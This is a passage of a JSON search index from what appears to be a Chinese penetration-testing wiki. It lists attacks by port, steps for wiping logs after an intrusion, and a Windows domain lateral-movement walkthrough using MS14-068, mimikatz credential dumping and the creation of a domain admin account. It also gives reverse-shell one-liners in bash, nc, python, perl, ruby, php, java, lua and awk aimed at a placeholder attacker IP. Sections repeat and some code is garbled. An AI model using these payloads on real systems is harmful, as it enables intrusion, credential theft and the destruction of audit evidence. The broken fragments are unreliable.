x.x.x.x 4321 //\u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u6253\u5f00\u4e24\u4e2a\u7ec8\u7aef\uff0c\u5206\u522b\u76d1\u542c 1234 \u548c 4321 \u7aef\u53e3\uff0c\u5f97\u5230\u53cd\u5f39shell\u540e\uff0c1234 \u7ec8\u7aef \u8f93\u5165\u547d\u4ee4\uff0c 4321 \u7ec8\u7aef\u5c31\u4f1a\u83b7\u5f97\u6267\u884c\u76f8\u5e94\u547d\u4ee4\u540e\u7684\u7ed3\u679c \u7531\u4e8e\u73b0\u5728\u5f88\u591a\u4e3b\u673a\u4e0a\u53ef\u80fd\u6ca1\u6709netcat\u4e86\uff0c\u6240\u4ee5\u5982\u679c\u9047\u5230\u867d\u7136\u6709netcat \u4f46\u4e0d\u652f\u6301 nc -e /bin/bash \u653b\u51fb\u4e3b\u673aip port \u4e2d -e\u9009\u9879\u7684\u4e3b\u673a\uff0c\u8fd8\u53ef\u4ee5\u8fd9\u6837\u53cd\u5f39shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f rm /tmp/f \u5220\u9664\u547d\u4ee4 mkfifo /tmp/f; \u5728tmp\u76ee\u5f55\u4e0b\u5199fifo\u6587\u4ef6f /bin/sh -i 2>&1 \u5c06/bin/sh \u7684\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa nc x.x.x.x 2333 >/tmp/f\u5c06nc\u76d1\u542c\u5230\u7684\u8f93\u5165 \u8f93\u5165\u5230fifo 0x03. telnet\u53cd\u5f39 \u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u6253\u5f00\u4e24\u4e2a\u7ec8\u7aef\u5206\u522b\u76d1\u542c 1234 \u548c 4321\u7aef\u53e3,(\u786e\u4fdd\u7aef\u53e3\u5f00\u653e\uff0c\u5e76\u4e14\u4e0d\u88ab\u5360\u7528)\uff0c\u5f97\u5230\u53cd\u5f39shell\u540e\uff0c1234 \u7ec8\u7aef \u8f93\u5165\u547d\u4ee4\uff0c 4321 \u7ec8\u7aef\u5c31\u4f1a\u83b7\u5f97\u6267\u884c\u76f8\u5e94\u547d\u4ee4\u540e\u7684\u7ed3\u679c\uff1a nc -lvvp 1234 nc -lvvp 4321 \u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\uff1a telnet \u653b\u51fb\u4e3b\u673aip 1234 | /bin/bash | telnet \u653b\u51fb\u4e3b\u673aip 4321 \u5e38\u89c1\u811a\u672c\u53cd\u5f39 \u811a\u672c\u662f\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\uff0c\u5176\u4e2d x.x.x.x \u5747\u4e3a\u653b\u51fb\u4e3b\u673aip\uff0c\u5e76\u4e14\u9700\u8981\u63d0\u524d\u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u8fdb\u884c\u76d1\u542c\u76f8\u5173\u7aef\u53e3,\u63a5\u4e0b\u6765\u5c31\u4e0d\u518d\u8d58\u8ff0 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' 1 perl \u65b9\u6cd5\u4e00\uff1a perl -e 'use Socket; i=\"x.x.x.x\"; i=\"x.x.x.x\"; p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in( p,inet_aton( p,inet_aton( i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' 1 \u65b9\u6cd5\u4e8c\uff1a perl -MIO -e ' p=fork;exit,if( p=fork;exit,if( p); c=new IO::Socket::INET(PeerAddr,\"x.x.x.x:5555\");STDIN->fdopen( c=new IO::Socket::INET(PeerAddr,\"x.x.x.x:5555\");STDIN->fdopen( c,r); ~->fdopen( ~->fdopen( c,w);system _ while<>;' 3. Ruby ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"x.x.x.x\",\"5555\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' 4. PHP php -r ' _ while<>;' 3. Ruby ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"x.x.x.x\",\"5555\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' 4. PHP php -r ' sock=fsockopen(\"x.x.x.x\",5555);exec(\"/bin/bash -i <&3 >&3 2>&3\");' 5. Java public class Revs { /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception { // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= {\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/x.x.x.x/5555;cat <&5 | while read line; do $line 2>&5 >&5; done\"}; Process p = r.exec(cmd); p.waitFor(); } } 6. Lua lua -e \"require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');\" 7. AWK \u53cd\u5f39 \u653b\u51fb\u7684\u673a\u5668\u76d1\u542c\uff0c\u5728\u6536\u5230shell\u7684\u65f6\u5019\u4e0d\u53ef\u4ee5\u8f93\u5165enter\uff0c\u4e0d\u7136\u4f1a\u65ad\u5f00 awk 'BEGIN{s=\"/inet/tcp/0/x.x.x.x/8080\";for(;s|&getline c;close\u00a9)while(c|getline)print|&s;c 14\u3001\u7b80\u8ff0MSF\u7684\u6a21\u5757\u548c\u5176\u4f5c\u7528 1)\u8f85\u52a9\u6a21\u5757\u626b\u63cf\u3001\u53e3\u4ee4\u7834\u89e3\u3001\u654f\u611f\u4fe1\u606f\u55c5\u63a2\u7b49;\u7535\u4e2d\u56fd\u5783\u5bb6\u822a\u5408 2)\u6e17\u900f\u653b\u51fb\u6a21\u5757\u5229\u7528\u53d1\u73b0\u7684\u5b89\u5168\u6f0f\u6d1e\u5bf9\u76ee\u6807\u8fdb\u884c\u653b\u51fb\uff0c\u690d\u5165\u8fd0\u884c\u653b\u51fb\u8f7d\u8377 payload\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u8bbf\u95ee\u6743: 3)\u7f16\u7801\u5668\u6a21\u5757\u8fdb\u884c\u7f16\u7801\u4fdd\u8bc1\u4e0d\u4f1a\u51fa\u73b0\u574f\u5b57\u7b26\uff0c\u8fd8\u53ef\u4ee5\u505a\u514d\u6740\u5904\u7406; 4)\u540e\u6e17\u900f\u653b\u51fb\u6a21\u5757\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u5b9e\u65bd\u8df3\u677f\u653b\u51fb\u7b49","title":"\u6e17\u900f\u6d4b\u8bd5"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"","title":"\u6e17\u900f\u601d\u8def"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"21\u7aef\u53e3\uff0cftp \u53ef\u7206\u7834\u6216\u8005\u5c1d\u8bd5\u533f\u540danonymous/\u7a7a\u767b\u5f55 21 ftp \u53ef\u7206\u7834 \u533f\u540danonymous/\u7a7a\u767b\u5f55 MS12-073 22 ssh \u7206\u7834 28\u4e2a\u9000\u683c 23 telnet \u7206\u7834 25 smtp \u90ae\u4ef6\u4f2a\u9020 53 dns dns\u533a\u57df\u4f20\u8f93dns\u52ab\u6301 dns\u7f13\u5b58\u6295\u6bd2 dns\u6b3a\u9a97 \u6df1\u5ea6\u5229\u7528\u5229\u7528dns\u96a7\u9053\u6280\u672f\u523a\u5934\u9632\u706b\u5899 67/68 dhcp \u52ab\u6301\u6b3a\u9a97 80 web 110 pop3 \u7206\u7834 139 samba \u672a\u6388\u6743\u8bbf\u95ee \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e 143 iamp \u7206\u7834 445 smb ms08-067 ms17-010\u6ea2\u51fa\u6f0f\u6d1e IPC$\u653b\u51fb 1433 sqlserver \u6ea2\u51fa\u653b\u51fb \u7a7a\u5bc6\u7801\u5165\u4fb5\u30021433\u8fd8\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u5c31\u662f\u5982\u679c\u9ed8\u8ba4\u5b89\u88c5\u7684\u8bdd\uff0c\u7528\u6237\u540d\u662fsa,\u5bc6\u7801\u662f\u7a7a\u7684 3306 mysql \u66b4\u7834 \u6210\u529f\u540e\u7528mysql\u5199\u5165webshell\uff0c\u6216\u8005\u6784\u9020vbs\u5199\u5165\u670d\u52a1\u5668\u542f\u52a8\u9879\uff0c\u542f\u52a8\u65f6\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u6253\u5f003389\u7aef\u53e3 8088 hadoop yarn \u8d44\u6e90\u7ba1\u7406\u5668rest api\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u901a\u8fc7curl -v -X POST\u7533\u8bf7\u65b0\u7684application\uff0c\u6784\u9020\u63d0\u4ea4\u4efb\u52a1\u540e\u5373\u53ef\u5728\u76f8\u5e94\u76ee\u5f55\u751f\u6210webshell 8161 apache activeMQ console\u5b58\u5728\u9ed8\u8ba4\u7aef\u53e3\u548c\u9ed8\u8ba4\u5bc6\u7801\u3001\u672a\u6388\u6743\u8bbf\u95ee \u5f53activeMQ\u5f00\u542fput\u8bf7\u6c42\u65f6\u6784\u9020payload\uff08\u5373\u4e0d\u5b58\u5728\u7684\u76ee\u5f55\uff09response\u4f1a\u8fd4\u56de\u76f8\u5e94\u7684\u7269\u7406\u8def\u5f84\u4fe1\u606f\uff0c\u5f53fileserver\u5b58\u5728\u65f6\u6211\u4eec\u53ef\u4ee5\u4e0a\u4f20jspwebshell\uff0c activeMQ\u8fd8\u652f\u6301move\u534f\u8bae\uff0c\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u79fb\u52a8\u6f0f\u6d1e 6379 redis \u914d\u7f6e\u4e0d\u5f53\u7684\u672a\u6388\u6743 \u94fe\u63a5redis\uff08./redis-cli -h IP)\uff0c\u53ef\u5b9e\u73b0\u5199\u5165webshell\uff0c\u5199\u5165crontab\u8ba1\u5212\u4efb\u52a1fantanshell\uff0c\u4ee5\u53ca\u5199\u5165ssh\u516c\u94a5\uff0c\u83b7\u53d6\u64cd\u4f5c\u7cfb\u7edf\u6743\u9650 \u66b4\u7834 11211 memcached \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\uff0ctelnet ip\u5c31\u53ef\u4ee5\u83b7\u5f97\u670d\u52a1\u5668\u654f\u611f\u4fe1\u606f","title":"\u7aef\u53e3\u5bf9\u5e94\u7684\u670d\u52a1"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"\u4fe1\u606f\u6536\u96c6 \u6f0f\u6d1e\u6316\u6398 \u6f0f\u6d1e\u5229\u7528&\u6743\u9650\u63d0\u5347 \u6e05\u9664\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u62a5\u544a","title":"\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#linux","text":"web sed -i -e \u5b9a\u5411\u6e05\u695a access.log, error.log history ~/bash_history wtmp /var/log/wtmp \u767b\u5f55\u65e5\u5fd7 /var/log/secure","title":"\u5165\u4fb5Linux\u540e\u8981\u6e05\u695a\u7684\u65e5\u5fd7"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_4","text":"MS14-068 kerkeo klist klist purge \u5220\u9664\u6240\u6709\u7968\u636e \u76f4\u63a5\u8bbf\u95ee\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\qianxiao996-dm.qianxiao996.com\\C \u67e5\u770b\u672c\u673a\u7528\u6237\u4fe1\u606f,\u8bb0\u5f55\u7528\u6237\u540d\u4e0eSID\u53f7whoami /all \u8fdb\u5165MS14-068\u76ee\u5f55\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1aip\u4e3a\u57df\u63a7\u7684ip MS14-068.exe -u @ -s -d -p MS14-068.exe -u zhangsanfeng@qianxiao996.com -s S-1-5-21-2461438818-3229013638-4126918765-1108 -d 192.168.91.131 -p ABCabc123 <br/>\u751f\u6210\u7684\u7968\u636e\u6587\u4ef6<br>\u6253\u5f00mimikatz\uff0c\u6ce8\u5165\u7968\u636e<br> mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1 mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1 mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d <br>\u67e5\u770b\u672c\u673a\u7528\u6237\u4fe1\u606f,\u8bb0\u5f55\u7528\u6237\u540d\u4e0eSID\u53f7whoami /all<br>\u8fdb\u5165MS14-068\u76ee\u5f55\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1aip\u4e3a\u57df\u63a7\u7684ip MS14-068.exe -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword><br/>MS14-068.exe -u <a href=\"&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#122;&#104;&#97;&#110;&#103;&#115;&#97;&#110;&#102;&#101;&#110;&#103;&#64;&#113;&#105;&#97;&#110;&#120;&#105;&#97;&#111;&#57;&#57;&#54;&#46;&#99;&#111;&#109;\">&#122;&#104;&#97;&#110;&#103;&#115;&#97;&#110;&#102;&#101;&#110;&#103;&#64;&#113;&#105;&#97;&#110;&#120;&#105;&#97;&#111;&#57;&#57;&#54;&#46;&#99;&#111;&#109;</a> -s S-1-5-21-2461438818-3229013638-4126918765-1108 -d 192.168.91.131 -p ABCabc123<code>&lt;br/&gt;\u751f\u6210\u7684\u7968\u636e\u6587\u4ef6&lt;br&gt;\u6253\u5f00mimikatz\uff0c\u6ce8\u5165\u7968\u636e&lt;br&gt;</code>mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1<br/>mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1<br/>mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d<code>&lt;br&gt;&lt;br/&gt;\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1a\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\\\qianxiao996-dm.qianxiao996.com\\Cmimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1&lt;br/&gt;mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1&lt;br/&gt;mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d</code><br><br/>\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1a\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\qianxiao996-dm.qianxiao996.com\\C \u4f7f\u7528PSTools\u76ee\u5f55\u4e0b\u7684PsExec.exe\u83b7\u53d6shell:PsExec.exe \\qianxiao996-dm.qianxiao996.com cmd.exe \u6dfb\u52a0\u57df\u7ba1\u7406\u5458net user wangergou ABCabc123 /add /domain net group \"Domain admins\" wangergou /add /domain 0x02.GPP\u6f0f\u6d1e \u7ec4\u7b56\u7565\u4e0b\u53d1 \u7ba1\u7406\u5de5\u5177\u4e2d\u6253\u5f00\u7ec4\u7b56\u7565\u7ba1\u7406\uff1a\u9009\u62e9\u57df\uff0c\u5e76\u65b0\u5efa\u7ec4\u7ec7\u5355\u4f4d\uff1a\u9009\u62e9\u65b0\u5efa\u7684\u7ec4\u7ec7\u5355\u4f4d\uff0c\u5e76\u5efa\u7acbGPO\uff1a\u70b9\u51fb\u65b0\u5efa\u7684GPO\uff1a\u8bbe\u5b9a\u7ec4\u7b56\u7565\u4f5c\u7528\u8303\u56f4\uff1a\uff08\u9009\u62e9\u4e00\u4e2a\u7ec4\uff0c\u5fc5\u987b\u662f\u5b58\u5728\u7684\u7ec4\uff09\u53f3\u952e\u9009\u62e9GPO\uff0c\u9009\u62e9\u7f16\u8f91\u2013\u672c\u5730\u7528\u6237\u548c\u7ec4\uff1a\u65b0\u5efa\u4e00\u4e2a\u7528\u6237\uff1a\u57df\u6210\u5458\u4e0a\u66f4\u65b0\u7ec4\u7b56\u7565\uff0c\u5e76\u67e5\u770b\u7528\u6237:gpupdate net user 0x03.SPN\u7968\u636e\u7834\u89e3 \u5217\u51fa\u5f53\u524d\u7528\u6237\u7684\u7968\u636e\uff1aKerberos::list \u5bfc\u51fa\u7968\u636e\uff1aKerberos::list /export \u7531\u4e8e\u52a0\u5bc6\u7c7b\u578b\u662fRC4_HMAC_MD5\uff0cKerberos\u534f\u8bae\u7b2c\u56db\u6b65TGS-REP\u5c06\u4f1a\u8fd4\u56de\u7528\u670d\u52a1\u5e10\u6237\u7684NTLM\u5bc6\u7801\u54c8\u5e0c\u52a0\u5bc6\u7684\u7968\u636e\u3002 \u4f7f\u7528\u5b57\u5178\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff1a\uff082.txt\u4e3a\u5b57\u5178\uff09python tgsrepcrack.py 2.txt \"1-40a10000-linghuchong@MSSQLSvc College-DS1 1433-COLLEGE.COM.kirbi\" \u867d\u7136\"sekurlsa::pth\"\u5728mimikatz\u4e2d\u88ab\u79f0\u4e4b\u4e3a\"Pass The Hash\",\u4f46\u662f\u5176\u5df2\u7ecf\u8d85\u8d8a\u4e86\u4ee5\u524d\u7684\"Pass The Hash\"\uff0c\u90e8\u5206\u4eba\u5c06\u5176\u547d\u540d\u4e3a\"Overpass-the-hash\"\uff0c\u4e5f\u5c31\u662f\"Pass-the-key\" \u767b\u5f55\u57df\u6210\u5458\u673a\u5668\uff0c\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884cmimikatz\uff0c\u5e76\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\uff1a privilege::debug log sekurlsa::logonpasswords","title":"\u57df\u5185\u6a2a\u5411\u79fb\u52a8"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#shell","text":"Windows: powersnell \u53cd\u5f39shell\u3001powercat \u53cd\u5f39shell Linux: bash \u53cd\u5f39shell\u3001netcat \u53cd\u5f39shell\u3001wget \u53cd\u5f39shell\u3001python \u53cd\u5f39shell\u3001 php\u53cd\u5f39shell \u4e00\u4e9b\u811a\u672c bash \u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u6267\u884c\u7aef\u53e3\u76d1\u542c\uff1a nc -lvvp port //port \u4e3a\u653b\u51fb\u4e3b\u673a\u7aef\u53e3\u53f7\uff0c\u5e76\u4e14\u6b64\u7aef\u53e3\u53f7\u6ca1\u6709\u88ab\u5360\u7528 \u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\uff1a bash -i >& /dev/tcp/\u653b\u51fb\u4e3b\u673aip/port 0>&1 //port \u4e3a\u653b\u51fb\u4e3b\u673a\u7aef\u53e3\u53f7 \u89e3\u91ca\uff1a bash -i \u6253\u5f00\u4e00\u4e2a\u4ea4\u4e92\u7684bash & \u5c06\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa /dev/tcp/x.x.x.x/port \u610f\u4e3a\u8c03\u7528socket,\u5efa\u7acbsocket\u8fde\u63a5,\u5176\u4e2dx.x.x.x\u4e3a\u8981\u53cd\u5f39\u5230\u7684\u4e3b\u673aip\uff0cport\u4e3a\u7aef\u53e3 0>&1 \u6807\u51c6\u8f93\u5165\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u5b9e\u73b0\u4f60\u4e0e\u53cd\u5f39\u51fa\u6765\u7684shell\u7684\u4ea4\u4e92 /dev/tcp/ \u662fLinux\u4e2d\u7684\u4e00\u4e2a\u7279\u6b8a\u8bbe\u5907,\u6253\u5f00\u8fd9\u4e2a\u6587\u4ef6\u5c31\u76f8\u5f53\u4e8e\u53d1\u51fa\u4e86\u4e00\u4e2asocket\u8c03\u7528\uff0c\u5efa\u7acb\u4e00\u4e2asocket\u8fde\u63a5\uff0c\u8bfb\u5199\u8fd9\u4e2a\u6587\u4ef6\u5c31\u76f8\u5f53\u4e8e\u5728\u8fd9\u4e2asocket\u8fde\u63a5\u4e2d\u4f20\u8f93\u6570\u636e\u3002\u540c\u7406\uff0cLinux\u4e2d\u8fd8\u5b58\u5728/dev/udp/\u3002 \u5176\u4ed6\u7248\u672c\uff1a exec 5<>/dev/tcp/x.x.x.x/9999 cat <&5 | while read line; do $line 2>&5 >&5; done \u7b2c\u4e00\u6761\u547d\u4ee4 \u5efa\u7acb\u4e0ex.x.x.x:9999\u7684tcp\u8fde\u63a5\uff0c\u5e76\u5c06\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u4f5c\u4e3adevice 5\u7684\u6807\u51c6\u8f93\u5165\u8f93\u51fa \u7b2c\u4e8c\u6761cat <&5 \u83b7\u53d6device5\u7684\u8f93\u5165; while read line; do $line 2>&5 >&5 \u4e00\u65e6\u83b7\u53d6\u5230\u547d\u4ee4\u4fbf\u8fd0\u884c \u7136\u540e\u5c06\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u4ee5\u53ca\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u5230device5\u4e2d nc(netcat)\u53cd\u5f39 \u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u6267\u884c\u7aef\u53e3\u76d1\u542c\uff1a nc -lvvp port //port \u4e3a\u653b\u51fb\u4e3b\u673a\u7aef\u53e3\u53f7\uff0c\u5e76\u4e14\u6b64\u7aef\u53e3\u53f7\u6ca1\u6709\u88ab\u5360\u7528 \u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\uff1a nc -e /bin/bash \u653b\u51fb\u4e3b\u673aip port \u8fd8\u53ef\u4ee5\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u8fd9\u6837\u6267\u884c nc x.x.x.x 1234|/bin/bash|nc x.x.x.x 4321 //\u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u6253\u5f00\u4e24\u4e2a\u7ec8\u7aef\uff0c\u5206\u522b\u76d1\u542c 1234 \u548c 4321 \u7aef\u53e3\uff0c\u5f97\u5230\u53cd\u5f39shell\u540e\uff0c1234 \u7ec8\u7aef \u8f93\u5165\u547d\u4ee4\uff0c 4321 \u7ec8\u7aef\u5c31\u4f1a\u83b7\u5f97\u6267\u884c\u76f8\u5e94\u547d\u4ee4\u540e\u7684\u7ed3\u679c \u7531\u4e8e\u73b0\u5728\u5f88\u591a\u4e3b\u673a\u4e0a\u53ef\u80fd\u6ca1\u6709netcat\u4e86\uff0c\u6240\u4ee5\u5982\u679c\u9047\u5230\u867d\u7136\u6709netcat \u4f46\u4e0d\u652f\u6301 nc -e /bin/bash \u653b\u51fb\u4e3b\u673aip port \u4e2d -e\u9009\u9879\u7684\u4e3b\u673a\uff0c\u8fd8\u53ef\u4ee5\u8fd9\u6837\u53cd\u5f39shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f rm /tmp/f \u5220\u9664\u547d\u4ee4 mkfifo /tmp/f; \u5728tmp\u76ee\u5f55\u4e0b\u5199fifo\u6587\u4ef6f /bin/sh -i 2>&1 \u5c06/bin/sh \u7684\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa nc x.x.x.x 2333 >/tmp/f\u5c06nc\u76d1\u542c\u5230\u7684\u8f93\u5165 \u8f93\u5165\u5230fifo 0x03. telnet\u53cd\u5f39 \u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u6253\u5f00\u4e24\u4e2a\u7ec8\u7aef\u5206\u522b\u76d1\u542c 1234 \u548c 4321\u7aef\u53e3,(\u786e\u4fdd\u7aef\u53e3\u5f00\u653e\uff0c\u5e76\u4e14\u4e0d\u88ab\u5360\u7528)\uff0c\u5f97\u5230\u53cd\u5f39shell\u540e\uff0c1234 \u7ec8\u7aef \u8f93\u5165\u547d\u4ee4\uff0c 4321 \u7ec8\u7aef\u5c31\u4f1a\u83b7\u5f97\u6267\u884c\u76f8\u5e94\u547d\u4ee4\u540e\u7684\u7ed3\u679c\uff1a nc -lvvp 1234 nc -lvvp 4321 \u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\uff1a telnet \u653b\u51fb\u4e3b\u673aip 1234 | /bin/bash | telnet \u653b\u51fb\u4e3b\u673aip 4321 \u5e38\u89c1\u811a\u672c\u53cd\u5f39 \u811a\u672c\u662f\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\uff0c\u5176\u4e2d x.x.x.x \u5747\u4e3a\u653b\u51fb\u4e3b\u673aip\uff0c\u5e76\u4e14\u9700\u8981\u63d0\u524d\u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u8fdb\u884c\u76d1\u542c\u76f8\u5173\u7aef\u53e3,\u63a5\u4e0b\u6765\u5c31\u4e0d\u518d\u8d58\u8ff0 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' 1 perl \u65b9\u6cd5\u4e00\uff1a perl -e 'use Socket; i=\"x.x.x.x\"; i=\"x.x.x.x\"; p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in( p,inet_aton( p,inet_aton( i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' 1 \u65b9\u6cd5\u4e8c\uff1a perl -MIO -e ' p=fork;exit,if( p=fork;exit,if( p); c=new IO::Socket::INET(PeerAddr,\"x.x.x.x:5555\");STDIN->fdopen( c=new IO::Socket::INET(PeerAddr,\"x.x.x.x:5555\");STDIN->fdopen( c,r); ~->fdopen( ~->fdopen( c,w);system _ while<>;' 3. Ruby ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"x.x.x.x\",\"5555\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' 4. PHP php -r ' _ while<>;' 3. Ruby ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"x.x.x.x\",\"5555\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' 4. PHP php -r ' sock=fsockopen(\"x.x.x.x\",5555);exec(\"/bin/bash -i <&3 >&3 2>&3\");' 5. Java public class Revs { /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception { // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= {\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/x.x.x.x/5555;cat <&5 | while read line; do $line 2>&5 >&5; done\"}; Process p = r.exec(cmd); p.waitFor(); } } 6. Lua lua -e \"require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');\" 7. AWK \u53cd\u5f39 \u653b\u51fb\u7684\u673a\u5668\u76d1\u542c\uff0c\u5728\u6536\u5230shell\u7684\u65f6\u5019\u4e0d\u53ef\u4ee5\u8f93\u5165enter\uff0c\u4e0d\u7136\u4f1a\u65ad\u5f00 awk 'BEGIN{s=\"/inet/tcp/0/x.x.x.x/8080\";for(;s|&getline c;close\u00a9)while(c|getline)print|&s;c 14\u3001\u7b80\u8ff0MSF\u7684\u6a21\u5757\u548c\u5176\u4f5c\u7528 1)\u8f85\u52a9\u6a21\u5757\u626b\u63cf\u3001\u53e3\u4ee4\u7834\u89e3\u3001\u654f\u611f\u4fe1\u606f\u55c5\u63a2\u7b49;\u7535\u4e2d\u56fd\u5783\u5bb6\u822a\u5408 2)\u6e17\u900f\u653b\u51fb\u6a21\u5757\u5229\u7528\u53d1\u73b0\u7684\u5b89\u5168\u6f0f\u6d1e\u5bf9\u76ee\u6807\u8fdb\u884c\u653b\u51fb\uff0c\u690d\u5165\u8fd0\u884c\u653b\u51fb\u8f7d\u8377 payload\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u8bbf\u95ee\u6743: 3)\u7f16\u7801\u5668\u6a21\u5757\u8fdb\u884c\u7f16\u7801\u4fdd\u8bc1\u4e0d\u4f1a\u51fa\u73b0\u574f\u5b57\u7b26\uff0c\u8fd8\u53ef\u4ee5\u505a\u514d\u6740\u5904\u7406; 